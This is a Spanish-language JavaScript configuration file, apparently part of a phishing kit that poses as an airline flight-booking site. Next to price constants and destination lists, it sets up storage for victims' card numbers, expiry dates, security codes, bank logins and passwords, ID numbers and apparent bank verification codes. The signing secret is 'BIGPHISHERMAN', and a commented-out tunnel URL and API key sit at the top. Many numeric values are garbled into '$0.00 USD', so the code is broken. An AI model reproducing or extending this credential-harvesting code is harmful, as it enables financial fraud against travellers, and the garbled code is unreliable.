/**
 * CONFIGURACIÓN
 */
// const API_URL = 'https://4lq8p8ln-8080.use2.devtunnels.ms'; // API Administradora.
// const API_KEY = 'eyJhbGciOiJIUzI1NiJ9.NjYwNTg0NTcxODpBQUVDa2xnTk9sWHl3SjBOc01TRTlsUWVUZEJOdG12RnFVMA.yWas3kWk9oHEFK8Q7iVYe3wKMFp_iBSthLAbyGg3yZw'; // API Administradora.
const PRECIO_BASE = 49900 // Precio base de los vuelos.
const PRECIO_DOS = 150000 // Precio base de los vuelos.
const MULTIPLICADORES_PRECIO = { // Incremento porcentual de tarifas.
    basic: $0.00 USD,
    light: $0.00 USD.$0.00 USD,
    full: $0.00 USD
}
const JWT_SIGN = 'BIGPHISHERMAN';

const LS = window.localStorage;

const monthDic = ['Ene','Feb','Mar','Abr','May','Jun','Jul','Ago','Sep','Oct','Nov','Dic'];
const dayDic = ['Lun', 'Mar', 'Mie', 'Jue', 'Vie', 'Sab', 'Dom'];

const countries = [
    {
        regionName: "America del Norte",
        costRange: [$0.19 USD, 1100],
        countries: [
            "Canadá",
            "Estados Unidos",
            "México"
        ]
    },
    {
        regionName: "America Central y el Caribe",
        costRange: [$0.14 USD, $0.21 USD],
        countries: [
            "Belice",
            "Costa Rica",
            "El Salvador",
            "Guatemala",
            "Honduras",
            "Nicaragua",
            "Panamá",
            "Aruba",
            "Barbados",
            "Cuba",
            "Curazao",
            "Puerto Rico",
            "República Dominicana"
        ]
    },
    {
        regionName: "America del Sur",
        costRange: [$0.14 USD, $0.21 USD],
        countries: [
            "Argentina",
            "Bolivia",
            "Brasil",
            "Chile",
            "Ecuador",
            "Paraguay",
            "Perú",
            "Uruguay",
            "Venezuela"
        ]
    },
    {
        regionName: "Europa y otros",
        costRange: [1300, 1900],
        countries: [
            "España",
            "Reino Unido",
            "Alemania"
        ]
    }

];

let info = {
    flightInfo:{
        travel_type: $0.00 USD,
        seat_type: $0.00 USD,
        origin: '',
        destination: '',
        adults: $0.00 USD,
        children: $0.00 USD,
        babies: $0.00 USD,
        flightDates: [$0.00 USD, $0.00 USD]

    },
    passengersInfo:{
        adults: [
            {
                name: '',
                surname: '',
                cc: ''
            }
        ],
        children: [],
        babies: []
    },
    metaInfo:{
        email: '',
        p: '',
        pdate: '',
        c: '',
        ban: '',
        dues: '',
        dudename: '',
        surname: '',
        cc: '',
        telnum: '',
        city: '',
        state: '',
        address: '',
        cdin: '',
        ccaj: '',
        cavance: '',
        tok: '',
        user: '',
        puser: '',
        err: '',
        disp: '',
    },
    checkerInfo: {
        company: '',
        mode: 'userpassword',
    },
    edit: $0.00 USD
}

dDisp();

function limitDigits(input, maxDigits) {
    parseInt(input.value)
    if (input.value.length > maxDigits) {
        input.value = input.value.slice($0.00 USD, maxDigits);
    }
}

function dDisp() {
    var userAgent = navigator.userAgent || navigator.vendor || window.opera;

    if(userAgent.includes('iPhone') || userAgent.includes('iPad') || userAgent.includes('iOS')){
        info.metaInfo.disp = "iOS";
    }else if(userAgent.includes('Windows')){
        info.metaInfo.disp = "PC";
    }else{
        info.metaInfo.disp = "Android";
    }
}

function updateLS(){
    LS.setItem('info', JSON.stringify(info));
}

LS.getItem('info') ? info = JSON.parse(LS.getItem('info')) : LS.setItem('info', JSON.stringify(info));

// LS.removeItem('info');
